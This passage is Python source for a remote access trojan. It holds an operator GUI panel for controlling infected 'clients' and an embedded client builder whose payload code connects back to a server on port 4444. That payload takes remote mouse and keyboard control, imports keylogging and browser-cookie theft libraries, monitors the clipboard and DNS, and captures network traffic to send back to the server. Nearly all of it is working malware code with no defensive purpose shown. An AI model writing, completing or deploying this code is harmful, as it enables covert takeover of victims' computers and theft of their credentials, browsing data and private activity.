            indicator.create_oval(2, 2, 13, 13, fill="#555555", outline="")
            indicator.pack(side=tk.TOP)
            
            # Label below the indicator
            label = ctk.CTkLabel(indicator_frame, text=quality_labels[i], 
                               font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                               size=10))
            label.pack(side=tk.TOP)
            
            self.quality_indicators.append((indicator, quality_colors[i]))
        
        # Create performance graph panel
        self.graph_frame = ctk.CTkFrame(self.control_panel, fg_color=theme["card_color"])
        self.graph_frame.pack(fill=tk.X, pady=10, padx=10)
        
        # Create matplotlib figure for the graph
        self.fig, self.ax = plt.subplots(figsize=(8, 2), dpi=80)
        self.fig.patch.set_facecolor(theme["card_color"])
        self.ax.set_facecolor(theme["bg_color"])
        
        # Initialize plot data
        self.time_data = list(range(60))
        self.fps_data = [0] * 60
        self.latency_data = [0] * 60
        self.bandwidth_data = [0] * 60
        
        # Create line plots
        self.fps_line, = self.ax.plot(self.time_data, self.fps_data, 'g-', label='FPS')
        self.latency_line, = self.ax.plot(self.time_data, self.latency_data, 'r-', label='Latency (ms/10)')
        self.bandwidth_line, = self.ax.plot(self.time_data, self.bandwidth_data, 'b-', label='Bandwidth (KB/s)')
        
        # Configure appearance
        self.ax.set_xlim(0, 59)
        self.ax.set_ylim(0, 60)
        self.ax.set_xticks([])
        self.ax.legend(loc='upper right', fontsize='x-small')
        self.ax.grid(True, linestyle='--', alpha=0.7)
        self.ax.set_title("Performance Metrics", fontsize=10)
        
        # Embed matplotlib figure in tkinter
        self.canvas = FigureCanvasTkAgg(self.fig, master=self.graph_frame)
        self.canvas.draw()
        self.canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)
        
        # Hide the graph frame initially
        self.graph_frame.pack_forget()
        
        # Add button to toggle graph visibility
        self.toggle_graph_btn = ctk.CTkButton(metrics_frame, text="Show Performance Graph", 
                                            command=self.toggle_graph_visibility,
                                            fg_color=theme["button_color"],
                                            hover_color=theme["hover_color"])
        self.toggle_graph_btn.pack(pady=5)
        
        # Status display
        status_frame = ctk.CTkFrame(self.control_panel, fg_color="transparent")
        status_frame.pack(fill=tk.X, pady=5, padx=10)
        
        status_label = ctk.CTkLabel(status_frame, text="Status:", 
                                  font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                 size=FONT_STYLES["normal"][1], 
                                                 weight="bold"))
        status_label.pack(side=tk.LEFT, padx=5)
        
        self.status_value = ctk.CTkLabel(status_frame, text="Inactive", text_color=theme['danger_color'])
        self.status_value.pack(side=tk.LEFT, padx=5)
        
        # Screen display area
        self.screen_frame = ctk.CTkFrame(self.remote_desktop_frame, fg_color=theme["bg_color"])
        self.screen_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.screen_label = tk.Label(self.screen_frame, bg=theme["bg_color"],
                                  text="Remote desktop view will appear here", fg=theme['fg_color'])
        self.screen_label.pack(fill=tk.BOTH, expand=True)
        
        # Bind mouse and keyboard events
        self.screen_label.bind("<Motion>", self.on_mouse_move)
        self.screen_label.bind("<Button-1>", lambda e: self.on_mouse_click(e, "left", "press"))
        self.screen_label.bind("<ButtonRelease-1>", lambda e: self.on_mouse_click(e, "left", "release"))
        self.screen_label.bind("<Button-3>", lambda e: self.on_mouse_click(e, "right", "press"))
        self.screen_label.bind("<ButtonRelease-3>", lambda e: self.on_mouse_click(e, "right", "release"))
        self.screen_label.bind("<Button-2>", lambda e: self.on_mouse_click(e, "middle", "press"))
        self.screen_label.bind("<ButtonRelease-2>", lambda e: self.on_mouse_click(e, "middle", "release"))
        self.screen_label.bind("<MouseWheel>", self.on_mouse_wheel)
        
        # Make screen_label focusable for keyboard events
        self.screen_label.configure(takefocus=1)
        
        # Bind keyboard events
        self.screen_label.bind("<KeyPress>", self.on_key_press)
        self.screen_label.bind("<KeyRelease>", self.on_key_release)
        
        # Start metrics update thread
        self.metrics_update_thread = threading.Thread(target=self.update_metrics_thread, daemon=True)
        self.metrics_update_thread.start()
        
        # Register with theme manager if available
        self.register_with_theme_manager()
    
    def toggle_graph_visibility(self):
        """Toggle the visibility of the performance graph"""
        if self.graph_frame.winfo_manager():
            self.graph_frame.pack_forget()
            self.toggle_graph_btn.configure(text="Show Performance Graph")
        else:
            self.graph_frame.pack(fill=tk.X, pady=10, padx=10, before=self.control_panel.winfo_children()[-1])
            self.toggle_graph_btn.configure(text="Hide Performance Graph")
            # Refresh the graph
            self.update_performance_graph()
    
    def update_performance_graph(self):
        """Update the performance graph with current data"""
        if not self.graph_frame.winfo_manager():
            return  # Don't update if graph isn't visible
            
        # Update the data
        self.fps_line.set_ydata(self.fps_data)
        self.latency_line.set_ydata([min(l/10, 60) for l in self.latency_data])  # Scale latency to fit
        self.bandwidth_line.set_ydata([min(b/5, 60) for b in self.bandwidth_data])  # Scale bandwidth to fit
        
        # Redraw the canvas
        self.canvas.draw_idle()
    
    def register_with_theme_manager(self):
        """Register widgets with the theme manager if available"""
        if hasattr(self.rat_app, 'theme_manager') and self.rat_app.theme_manager is not None:
            tm = self.rat_app.theme_manager
            
            # Register frames
            tm.track_widget(self.remote_desktop_frame)
            tm.track_widget(self.control_panel)
            tm.track_widget(self.screen_frame)
            tm.track_widget(self.graph_frame)
            
            # Register buttons
            tm.track_widget(self.start_control_btn)
            tm.track_widget(self.stop_control_btn)
            tm.track_widget(self.toggle_graph_btn)
            
            # Register labels
            tm.track_widget(self.client_info_label, "label")
            tm.track_widget(self.status_value, "label")
            tm.track_widget(self.quality_value, "label")
            tm.track_widget(self.fps_value, "label")
            tm.track_widget(self.fps_metric_value, "label")
            tm.track_widget(self.latency_value, "label")
            tm.track_widget(self.bandwidth_value, "label")
            tm.track_widget(self.quality_metric_value, "label")
    
    def update_quality_label(self, *args):
        """Update the quality label when the slider changes"""
        self.quality_value.configure(text=str(self.quality_var.get()))
        
    def update_fps_label(self, *args):
        """Update the FPS label when the slider changes"""
        self.fps_value.configure(text=str(self.fps_var.get()))
    
    def update_metrics_thread(self):
        """Thread function to periodically update metrics"""
        while True:
            if self.is_controlling:
                self.update_metrics()
            time.sleep(1)  # Update once per second
    
    def update_metrics(self):
        """Update the connection metrics display"""
        current_time = time.time()
        time_diff = current_time - self.last_metrics_update
        
        # Update FPS
        if self.frame_count > 0:
            current_fps = self.frame_count / time_diff
            self.fps_history.append(current_fps)
            avg_fps = sum(self.fps_history) / len(self.fps_history)
            self.fps_metric_value.configure(text=f"{avg_fps:.1f}")
            
            # Update FPS graph data
            self.fps_data.pop(0)
            self.fps_data.append(min(avg_fps, 60))  # Cap at 60 for display
        
        # Update Bandwidth
        if self.last_frame_size > 0:
            bytes_per_second = self.last_frame_size / time_diff
            kb_per_second = bytes_per_second / 1024
            self.bandwidth_history.append(kb_per_second)
            avg_bandwidth = sum(self.bandwidth_history) / len(self.bandwidth_history)
            self.bandwidth_value.configure(text=f"{avg_bandwidth:.1f} KB/s")
            
            # Update bandwidth graph data
            self.bandwidth_data.pop(0)
            self.bandwidth_data.append(avg_bandwidth)
        
        # Only update the graph if it's visible
        if self.graph_frame.winfo_manager():
            self.update_performance_graph()
        
        # Update connection quality indicators
        self.update_connection_quality()
        
        # Reset counters
        self.frame_count = 0
        self.last_frame_size = 0
        self.last_metrics_update = current_time
    
    def update_connection_quality(self):
        """Update the connection quality visualization based on current metrics"""
        # Get average metrics
        avg_fps = sum(self.fps_history) / max(len(self.fps_history), 1)
        avg_latency = sum(self.latency_history) / max(len(self.latency_history), 1)
        avg_bandwidth = sum(self.bandwidth_history) / max(len(self.bandwidth_history), 1)
        
        # Calculate an overall quality score (0-100)
        # This is a simple heuristic and could be adjusted based on needs
        fps_score = min(avg_fps / 30 * 100, 100)  # 30 FPS = 100%
        latency_score = max(0, 100 - (avg_latency / 5) * 100)  # 0ms = 100%, 500ms = 0%
        bandwidth_score = min(avg_bandwidth / 100 * 100, 100)  # 100 KB/s = 100%
        
        # Weighted average (prioritize latency slightly)
        quality_score = (fps_score * 0.3) + (latency_score * 0.4) + (bandwidth_score * 0.3)
        
        # Determine quality level (0-4)
        if quality_score < 20:
            quality_level = 0  # Poor
            quality_text = "Poor"
        elif quality_score < 40:
            quality_level = 1  # Fair
            quality_text = "Fair"
        elif quality_score < 60:
            quality_level = 2  # Good
            quality_text = "Good"
        elif quality_score < 80:
            quality_level = 3  # Very Good
            quality_text = "Very Good"
        else:
            quality_level = 4  # Excellent
            quality_text = "Excellent"
        
        # Update the quality indicators
        for i, (indicator, color) in enumerate(self.quality_indicators):
            if i <= quality_level:
                # Active indicator
                indicator.itemconfig(1, fill=color)
            else:
                # Inactive indicator
                indicator.itemconfig(1, fill="#555555")
        
        # Update quality text
        self.quality_metric_value.configure(text=quality_text)
        self.connection_quality = quality_text
        self.connection_quality_level = quality_level
    
    def update_client_info(self):
        """Update the client info when a client is selected"""
        if self.rat_app.current_client_socket:
            for addr, (client_id, conn) in self.rat_app.clients.items():
                if conn == self.rat_app.current_client_socket:
                    self.client_info_label.configure(text=f"{addr[0]}:{addr[1]}")
                    return
        
        self.client_info_label.configure(text="None")
    
    def update_latency(self, latency_ms):
        """Update the latency display with a new measurement"""
        self.latency_history.append(latency_ms)
        avg_latency = sum(self.latency_history) / len(self.latency_history)
        self.latency_value.configure(text=f"{avg_latency:.1f} ms")
        
        # Update latency graph data
        self.latency_data.pop(0)
        self.latency_data.append(avg_latency)
    
    def on_frame_received(self, frame_size):
        """Called when a new frame is received"""
        self.frame_count += 1
        self.last_frame_size = frame_size
        self.total_bytes_received += frame_size
        
        # Calculate and update latency if not done already
        current_time = time.time()
        frame_time = current_time - self.last_frame_time
        latency_ms = frame_time * 1000  # Convert to milliseconds
        self.update_latency(latency_ms)
        self.last_frame_time = current_time
    
    def start_remote_control(self):
        """Start remote desktop control session"""
        theme = self.get_theme_colors()
        
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        try:
            # First ensure we're receiving screen captures
            if not self.rat_app.receive_screenshot_trigger:
                self.rat_app.start_screen_capture()
            
            # Get control port
            try:
                self.control_port = int(self.port_entry.get())
                if self.control_port < 1024 or self.control_port > 65535:
                    raise ValueError("Port must be between 1024 and 65535")
            except ValueError as e:
                messagebox.showerror("Invalid Port", str(e))
                return
            
            # Send command to start remote desktop control
            control_command = f"START_REMOTE_DESKTOP|{self.control_port}"
            self.rat_app.current_client_socket.send(control_command.encode())
            
            # Wait for acknowledgment
            response = self.rat_app.current_client_socket.recv(1024).decode()
            
            if response.startswith("REMOTE_DESKTOP_STARTED"):
                # Extract client screen dimensions if provided
                if "|" in response:
                    dims = response.split("|")[1].split("x")
                    if len(dims) == 2:
                        self.client_width = int(dims[0])
                        self.client_height = int(dims[1])
                        self.rat_app.log(f"Client screen dimensions: {self.client_width}x{self.client_height}")
                
                # Connect to the control port
                self.connect_to_control_port()
                
                # Update UI
                self.is_controlling = True
                self.status_value.configure(text="Active", text_color=theme['success_color'])
                self.start_control_btn.configure(state="disabled")
                self.stop_control_btn.configure(state="normal")
                
                # Make screen_label focused to capture keyboard events
                self.screen_label.focus_set()
                
                # Update screenshot quality and FPS
                if hasattr(self.rat_app, 'SCREENSHOT_QUALITY'):
                    self.rat_app.SCREENSHOT_QUALITY = self.quality_var.get()
                if hasattr(self.rat_app, 'SCREENSHOT_INTERVAL'):
                    self.rat_app.SCREENSHOT_INTERVAL = 1.0 / self.fps_var.get()
                
                # Reset metrics
                self.frame_count = 0
                self.fps_history.clear()
                self.latency_history.clear()
                self.bandwidth_history.clear()
                self.last_frame_time = time.time()
                self.last_metrics_update = time.time()
                self.total_bytes_received = 0
                
                # Update connection quality display
                for indicator, _ in self.quality_indicators:
                    indicator.itemconfig(1, fill="#555555")
                
                self.quality_metric_value.configure(text="Measuring...")
                self.fps_metric_value.configure(text="0.0")
                self.latency_value.configure(text="0 ms")
                self.bandwidth_value.configure(text="0 KB/s")
                
                self.rat_app.log("Remote desktop control started")
            else:
                self.rat_app.log(f"Failed to start remote desktop control: {response}")
        
        except Exception as e:
            self.rat_app.log(f"Error starting remote desktop control: {e}")
        
        except Exception as e:
            self.rat_app.log(f"Error starting remote desktop control: {e}")
    
    def connect_to_control_port(self):
        """Connect to the client's control port"""
        try:
            # Get client IP address
            client_ip = None
            for addr, (client_id, conn) in self.rat_app.clients.items():
                if conn == self.rat_app.current_client_socket:
                    client_ip = addr[0]
                    break
            
            if not client_ip:
                raise Exception("Could not determine client IP address")
            
            # Create socket and connect
            self.control_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.control_socket.connect((client_ip, self.control_port))
            
            self.rat_app.log(f"Connected to control port {self.control_port}")
            
        except Exception as e:
            self.rat_app.log(f"Error connecting to control port: {e}")
            self.control_socket = None
    
    def stop_remote_control(self):
        """Stop remote desktop control session"""
        theme = self.get_theme_colors()
        if not self.rat_app.current_client_socket or not self.is_controlling:
            return
        
        try:
            # Send command to stop remote desktop control
            self.rat_app.current_client_socket.send(b"STOP_REMOTE_DESKTOP")
            
            # Close control socket
            if self.control_socket:
                try:
                    self.control_socket.close()
                except:
                    pass
                self.control_socket = None
            
            # Wait for acknowledgment
            try:
                response = self.rat_app.current_client_socket.recv(1024).decode()
                self.rat_app.log(f"Received stop response: {response}")
            except:
                pass
            
            # Update UI
            self.is_controlling = False
            self.status_value.configure(text="Inactive", text_color=theme['danger_color'])
            self.start_control_btn.configure(state="normal")
            self.stop_control_btn.configure(state="disabled")
            
            # Clear metrics displays
            self.fps_metric_value.configure(text="0.0")
            self.latency_value.configure(text="0 ms")
            self.bandwidth_value.configure(text="0 KB/s")
            self.quality_metric_value.configure(text="Unknown")
            
            # Reset quality indicators
            for indicator, _ in self.quality_indicators:
                indicator.itemconfig(1, fill="#555555")
            
            self.rat_app.log("Remote desktop control stopped")
            
        except Exception as e:
            self.rat_app.log(f"Error stopping remote desktop control: {e}")
            self.is_controlling = False
            self.status_value.configure(text="Inactive", text_color=theme['danger_color'])
            self.start_control_btn.configure(state="normal")
            self.stop_control_btn.configure(state="disabled")
    
    def on_mouse_move(self, event):
        """Handle mouse movement events"""
        if not self.is_controlling or not self.control_socket:
            return
        
        try:
            # Get the current displayed image dimensions
            image = getattr(self.screen_label, 'image', None)
            
            if image:
                try:
                    # Get actual displayed size of the widget
                    widget_width = self.screen_label.winfo_width()
                    widget_height = self.screen_label.winfo_height()
                    
                    # Get the image size
                    if hasattr(self, 'client_width') and self.client_width > 0:
                        img_width = self.client_width
                        img_height = self.client_height
                    else:
                        # Fallback if client dimensions are not known
                        img_width = widget_width
                        img_height = widget_height
                    
                    # Calculate the scaling factor
                    scale = min(widget_width / img_width, widget_height / img_height)
                    scaled_width = int(img_width * scale)
                    scaled_height = int(img_height * scale)
                    
                    # Calculate the image position within the widget (for centering)
                    img_x_offset = (widget_width - scaled_width) // 2
                    img_y_offset = (widget_height - scaled_height) // 2
                    
                    # Only send if movement is significant
                    current_pos = (event.x, event.y)
                    if self.last_pos and abs(current_pos[0] - self.last_pos[0]) < 5 and abs(current_pos[1] - self.last_pos[1]) < 5:
                        return
                    
                    self.last_pos = current_pos
                    
                    # Adjust coordinates to account for the image position
                    adjusted_x = event.x - img_x_offset
                    adjusted_y = event.y - img_y_offset
                    
                    # Check if click is within the image bounds
                    if 0 <= adjusted_x <= scaled_width and 0 <= adjusted_y <= scaled_height:
                        # Calculate relative position within the actual displayed image (0 to 1)
                        rel_x = adjusted_x / scaled_width
                        rel_y = adjusted_y / scaled_height
                        
                        # Ensure values are within 0-1 range
                        rel_x = min(max(rel_x, 0), 1)
                        rel_y = min(max(rel_y, 0), 1)
                        
                        # Send command to client with a terminator
                        command = f"MOUSE_MOVE|{rel_x:.6f}|{rel_y:.6f}\n"
                        self.control_socket.send(command.encode())
                        
                        # Measure latency - start time
                        start_time = time.time()
                        
                        # Wait for acknowledgment
                        try:
                            self.control_socket.settimeout(0.1)  # Short timeout
                            self.control_socket.recv(1024)
                            
                            # Measure latency - end time and update
                            latency_ms = (time.time() - start_time) * 1000
                            # Only update metrics occasionally to avoid overloading the UI
                            if random.random() < 0.1:  # ~10% of movements
                                self.update_latency(latency_ms)
                                
                            self.control_socket.settimeout(None)
                        except socket.timeout:
                            pass  # This is ok for mouse movements
                except Exception as e:
                    self.rat_app.log(f"Error calculating mouse position: {e}")
        
        except Exception as e:
            self.rat_app.log(f"Error sending mouse movement: {e}")

    def on_mouse_click(self, event, button, state):
        """Handle mouse click events"""
        if not self.is_controlling or not self.control_socket:
            return
        
        try:
            # Calculate if the click is within the image area using the same logic as mouse_move
            widget_width = self.screen_label.winfo_width()
            widget_height = self.screen_label.winfo_height()
            
            # Get the image size
            if hasattr(self, 'client_width') and self.client_width > 0:
                img_width = self.client_width
                img_height = self.client_height
            else:
                # Fallback if client dimensions are not known
                img_width = widget_width
                img_height = widget_height
            
            # Calculate the scaling factor
            scale = min(widget_width / img_width, widget_height / img_height)
            scaled_width = int(img_width * scale)
            scaled_height = int(img_height * scale)
            
            # Calculate the image position within the widget (for centering)
            img_x_offset = (widget_width - scaled_width) // 2
            img_y_offset = (widget_height - scaled_height) // 2
            
            # Adjust coordinates to account for the image position
            adjusted_x = event.x - img_x_offset
            adjusted_y = event.y - img_y_offset
            
            # Check if click is within the image bounds
            if 0 <= adjusted_x <= scaled_width and 0 <= adjusted_y <= scaled_height:
                # Record start time for latency measurement
                start_time = time.time()
                
                # Send command to client with a terminator
                command = f"MOUSE_CLICK|{button}|{state}\n"
                self.control_socket.send(command.encode())
                
                # Wait for acknowledgment
                try:
                    self.control_socket.settimeout(1)
                    self.control_socket.recv(1024)
                    
                    # Measure latency
                    latency_ms = (time.time() - start_time) * 1000
                    self.update_latency(latency_ms)
                    
                    self.control_socket.settimeout(None)
                except socket.timeout:
                    pass
        
        except Exception as e:
            self.rat_app.log(f"Error sending mouse click: {e}")
    
    def on_mouse_wheel(self, event):
        """Handle mouse wheel events"""
        if not self.is_controlling or not self.control_socket:
            return
        
        try:
            # Windows uses event.delta, which is usually a multiple of 120
            # Convert to a reasonable scroll amount
            scroll_amount = event.delta // 120
            
            # Measure latency start
            start_time = time.time()
            
            # Send command to client
            command = f"MOUSE_SCROLL|{scroll_amount}\n"
            self.control_socket.send(command.encode())
            
            # Wait for acknowledgment
            try:
                self.control_socket.settimeout(1)
                self.control_socket.recv(1024)
                
                # Measure latency
                latency_ms = (time.time() - start_time) * 1000
                self.update_latency(latency_ms)
                
                self.control_socket.settimeout(None)
            except socket.timeout:
                pass
            
        except Exception as e:
            self.rat_app.log(f"Error sending mouse scroll: {e}")
    
    def on_key_press(self, event):
        """Handle key press events"""
        if not self.is_controlling or not self.control_socket:
            return
        
        try:
            # Convert special keys
            key = self._convert_key(event)
            
            if key:
                # Measure latency start
                start_time = time.time()
                
                # Send key press command
                command = f"KEY|{key}|press\n"
                self.control_socket.send(command.encode())
                
                # Wait for acknowledgment
                try:
                    self.control_socket.settimeout(1)
                    self.control_socket.recv(1024)
                    
                    # Measure latency
                    latency_ms = (time.time() - start_time) * 1000
                    self.update_latency(latency_ms)
                    
                    self.control_socket.settimeout(None)
                except socket.timeout:
                    pass
            
        except Exception as e:
            self.rat_app.log(f"Error sending key press: {e}")
    
    def on_key_release(self, event):
        """Handle key release events"""
        if not self.is_controlling or not self.control_socket:
            return
        
        try:
            # Convert special keys
            key = self._convert_key(event)
            
            if key:
                # Record latency start
                start_time = time.time()
                
                # Send key release command
                command = f"KEY|{key}|release\n"
                self.control_socket.send(command.encode())
                
                # Wait for acknowledgment
                try:
                    self.control_socket.settimeout(1)
                    self.control_socket.recv(1024)
                    
                    # Measure latency
                    latency_ms = (time.time() - start_time) * 1000
                    self.update_latency(latency_ms)
                    
                    self.control_socket.settimeout(None)
                except socket.timeout:
                    pass
            
        except Exception as e:
            self.rat_app.log(f"Error sending key release: {e}")
    
    def _convert_key(self, event):
        """Convert Tkinter key event to a key name that pyautogui can understand"""
        # Map of Tkinter key names to pyautogui key names
        key_map = {
            "Return": "enter",
            "BackSpace": "backspace",
            "Tab": "tab",
            "Escape": "escape",
            "space": "space",
            "Delete": "delete",
            "Up": "up",
            "Down": "down",
            "Left": "left",
            "Right": "right",
            "Home": "home",
            "End": "end",
            "Page_Up": "pageup",
            "Page_Down": "pagedown",
            "F1": "f1", "F2": "f2", "F3": "f3", "F4": "f4",
            "F5": "f5", "F6": "f6", "F7": "f7", "F8": "f8",
            "F9": "f9", "F10": "f10", "F11": "f11", "F12": "f12",
            "Control_L": "ctrl", "Control_R": "ctrl",
            "Alt_L": "alt", "Alt_R": "alt",
            "Shift_L": "shift", "Shift_R": "shift",
            "Win_L": "win", "Win_R": "win"
        }
        
        # Get the key name
        key_name = event.keysym
        
        # Check if it's a special key
        if key_name in key_map:
            return key_map[key_name]
        
        # If it's a printable character, return the character
        if len(key_name) == 1:
            return key_name
        
        # For other keys, try to handle them
        if hasattr(event, 'char') and event.char:
            return event.char
        
        return None
    
    
class ClientBuilderUtility:
    """Advanced client builder utility for generating customized RAT clients"""
    
    c_code = r'''
import socket
import threading
import time
import struct
import os
import platform
import subprocess
import zlib
import io
import cv2
import numpy as np
import pyaudio
from PIL import ImageGrab
import pynput
from pynput import keyboard
import sys
import ctypes
from datetime import datetime
import psutil
import json
import numpy as np
import time
import threading
import sqlite3
import os
import json
import base64
import shutil
import tempfile
from datetime import datetime
import socket
import struct
import psutil
from scapy.all import sniff, wrpcap
import win32clipboard
from winreg import *
import uuid
import browser_cookie3
from pynput.mouse import Controller as MouseController
from pynput.keyboard import Controller as KeyboardController
import pyautogui

# Configuration
SERVER_IP = "127.0.0.1"  # Change this to the server IP
SERVER_PORT = 4444       # Default server port
BUFFER_SIZE = 4096
SCREENSHOT_QUALITY = 30  # Lower number = higher quality (and larger file size)
SCREENSHOT_INTERVAL = 1/30  # Time between screenshots in seconds
MAX_UDP_SIZE = 64507  # Max UDP packet size



class RemoteDesktopControl:
    """Handles remote desktop control on the client side"""
    
    def __init__(self, client_socket):
        self.client_socket = client_socket
        self.control_active = False
        self.control_socket = None
        self.control_port = None
        
    def start(self, control_port):
        """Start the remote desktop control service"""
        try:
            # Create a dedicated socket for control commands
            self.control_port = control_port
            self.control_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.control_socket.bind(('0.0.0.0', self.control_port))
            self.control_socket.listen(1)
            
            # Start listening for control commands in a new thread
            self.control_active = True
            self.control_thread = threading.Thread(target=self.control_listener, daemon=True)
            self.control_thread.start()
            
            print(f"[*] Remote desktop control started on port {control_port}")
            return True
            
        except Exception as e:
            print(f"[!] Error starting remote desktop control: {e}")
            return False
    
    def stop(self):
        """Stop the remote desktop control service"""
        self.control_active = False
        
        if self.control_socket:
            try:
                self.control_socket.close()
            except:
                pass
        
        print("[*] Remote desktop control stopped")
    
    def control_listener(self):
        """Listen for and handle control commands from the server"""
        try:
            print("[*] Waiting for control connection...")
            server_socket, _ = self.control_socket.accept()
            server_socket.settimeout(1)  # 1 second timeout for responsive stopping
            
            print("[*] Control connection established")
            
            buffer = ""
            
            while self.control_active:
                try:
                    # Receive data with improved command separation
                    data = server_socket.recv(1024)
                    if not data:
                        break
                    
                    # Add received data to buffer
                    buffer += data.decode('utf-8')
                    
                    # Process each complete command in the buffer
                    while '|' in buffer:
                        # Check if the command is a movement command (they can come fast)
                        if buffer.startswith("MOUSE_MOVE|"):
                            # Find the end of this command
                            cmd_end = buffer.find("\n")
                            if cmd_end == -1:  # No newline, might be incomplete command
                                if len(buffer) > 50:  # If buffer is long enough, likely has a full command
                                    cmd_end = len(buffer)
                                else:
                                    break  # Wait for more data
                            
                            command = buffer[:cmd_end]
                            buffer = buffer[cmd_end+1:] if cmd_end < len(buffer) else ""
                        else:
                            # For other commands, find the command terminator
                            cmd_end = buffer.find("\n")
                            if cmd_end == -1:  # No command terminator, might be incomplete command
                                break
                                
                            command = buffer[:cmd_end]
                            buffer = buffer[cmd_end+1:]
                        
                        # Process the command
                        if command:
                            response = self.process_command(command)
                            
                            # Send acknowledgment
                            server_socket.send(response.encode())
                    
                except socket.timeout:
                    # This is expected with the timeout set
                    continue
                except Exception as e:
                    print(f"[!] Error in control connection: {e}")
                    break
            
            # Clean up
            try:
                server_socket.close()
            except:
                pass
                
            print("[*] Control connection closed")
            
        except Exception as e:
            print(f"[!] Control listener error: {e}")
    
    def process_command(self, command):
        """Process a control command and perform the corresponding action"""
        try:
            print(f"[DEBUG] Processing command: '{command}'")
            
            # Strip any whitespace that might cause parsing issues
            command = command.strip()
            
            parts = command.split('|')
            if len(parts) < 2:
                print(f"[!] Invalid command format: {command}")
                return "ERROR: Invalid command format"
                
            cmd_type = parts[0]
            
            if cmd_type == "MOUSE_MOVE":
                # Format: MOUSE_MOVE|rel_x|rel_y
                if len(parts) < 3:
                    return "ERROR: Invalid MOUSE_MOVE command"
                    
                try:
                    rel_x = float(parts[1])
                    rel_y = float(parts[2])
                    
                    # Get screen dimensions
                    screen_width, screen_height = pyautogui.size()
                    
                    # Calculate absolute position
                    x = int(rel_x * screen_width)
                    y = int(rel_y * screen_height)
                    
                    print(f"[DEBUG] Moving mouse to: {x},{y} (from rel: {rel_x},{rel_y})")
                    
                    # Move the mouse
                    pyautogui.moveTo(x, y)
                    return "OK"
                except ValueError as e:
                    print(f"[!] Error parsing mouse coordinates: {e}")
                    return f"ERROR: {str(e)}"
            
            elif cmd_type == "MOUSE_CLICK":
                # Format: MOUSE_CLICK|button|action
                if len(parts) < 3:
                    return "ERROR: Invalid MOUSE_CLICK command"
                    
                button = parts[1]  # left, right, middle
                action = parts[2]  # click, press, release
                
                print(f"[DEBUG] Mouse {button} {action}")
                
                if action == "click":
                    pyautogui.click(button=button)
                elif action == "press":
                    pyautogui.mouseDown(button=button)
                elif action == "release":
                    pyautogui.mouseUp(button=button)
                
                return "OK"
            
            elif cmd_type == "MOUSE_SCROLL":
                # Format: MOUSE_SCROLL|amount
                if len(parts) < 2:
                    return "ERROR: Invalid MOUSE_SCROLL command"
                    
                try:
                    amount = int(parts[1])
                    pyautogui.scroll(amount)
                    return "OK"
                except ValueError as e:
                    return f"ERROR: {str(e)}"
            
            elif cmd_type == "KEY":
                # Format: KEY|key|action
                if len(parts) < 3:
                    return "ERROR: Invalid KEY command"
                    
                key = parts[1]
                action = parts[2]  # press, release
                
                print(f"[DEBUG] Keyboard {key} {action}")
                
                if action == "press":
                    pyautogui.keyDown(key)
                elif action == "release":
                    pyautogui.keyUp(key)
                
                return "OK"
            
            elif cmd_type == "TYPE":
                # Format: TYPE|text
                if len(parts) < 2:
                    return "ERROR: Invalid TYPE command"
                    
                text = parts[1]
                pyautogui.write(text)
                return "OK"
            
            return f"UNKNOWN_COMMAND: {cmd_type}"
            
        except Exception as e:
            print(f"[!] Error processing command: {e}")
            return f"ERROR: {str(e)}"
                
    
class AdvancedMonitoring:
    """Advanced monitoring capabilities including network, clipboard, and browser data"""
    
    def __init__(self, client_socket, buffer_size=4096):
        self.client_socket = client_socket
        self.buffer_size = buffer_size
        
        # Flags for monitoring features
        self.network_capture_active = False
        self.clipboard_monitoring_active = False
        self.dns_monitoring_active = False
        self.browser_monitoring_active = False
        
        # Storage for monitoring data
        self.capture_file = os.path.join(tempfile.gettempdir(), "netcap.pcap")
        self.clipboard_history = []
        self.dns_history = []
        
        # Network capture thread
        self.network_thread = None
        self.clipboard_thread = None
        self.dns_thread = None
        self.browser_thread = None
    
    def handle_monitoring_command(self, command):
        """Process monitoring-related commands from the server"""
        # Convert bytes to string if necessary
        if isinstance(command, bytes):
            command = command.decode('utf-8')
            
        print(f"[*] Handling monitoring command: {command}")
        
        if command == "START_NETWORK_CAPTURE":
            self.start_network_capture()
        elif command == "STOP_NETWORK_CAPTURE":
            self.stop_network_capture()
        elif command == "GET_NETWORK_CAPTURE":
            self.send_network_capture()
        elif command == "START_CLIPBOARD_MONITORING":
            self.start_clipboard_monitoring()
        elif command == "STOP_CLIPBOARD_MONITORING":
            self.stop_clipboard_monitoring()
        elif command == "GET_CLIPBOARD_DATA":
            self.send_clipboard_data()
        elif command == "EXTRACT_BROWSER_DATA":
            self.extract_browser_data()
        elif command == "START_DNS_MONITORING":
            self.start_dns_monitoring()
        elif command == "STOP_DNS_MONITORING":
            self.stop_dns_monitoring()
        elif command == "GET_DNS_HISTORY":
            self.send_dns_history()
        elif command == "GET_SYSTEM_INFO":
            self.send_system_info()
    
    # Network Traffic Monitoring
    def start_network_capture(self):
        """Start capturing network traffic"""
        if not self.network_capture_active:
            print("[*] Starting network traffic capture")
            self.network_capture_active = True
            
            # Clear previous capture file if it exists
            if os.path.exists(self.capture_file):
                try:
                    os.remove(self.capture_file)
                except:
                    pass
            
            # Start capturing in a new thread
            self.network_thread = threading.Thread(target=self._network_capture_thread)
            self.network_thread.daemon = True
            self.network_thread.start()
            
            self.client_socket.send("SUCCESS: Network capture started".encode())
        else:
            self.client_socket.send("INFO: Network capture already active".encode())
    
    def _network_capture_thread(self):
        """Thread function for network capture"""
        try:
            # Capture packets to file
            print(f"[*] Writing network capture to {self.capture_file}")
            wrpcap(self.capture_file, sniff(timeout=0, store=True), append=True)
        except Exception as e:
            print(f"[!] Error in network capture: {e}")
            self.network_capture_active = False
    
    def stop_network_capture(self):
        """Stop capturing network traffic"""
        if self.network_capture_active:
            print("[*] Stopping network traffic capture")
            self.network_capture_active = False
            
            # Give a moment for the thread to finish
            time.sleep(1)
            
            self.client_socket.send("SUCCESS: Network capture stopped".encode())
        else:
            self.client_socket.send("INFO: No active network capture to stop".encode())
    
    def send_network_capture(self):
        """Send the captured network data to the server"""
        if os.path.exists(self.capture_file):
            try:
                # Get file size
                file_size = os.path.getsize(self.capture_file)
                
                # Send file size first
                self.client_socket.send(struct.pack('Q', file_size))
                
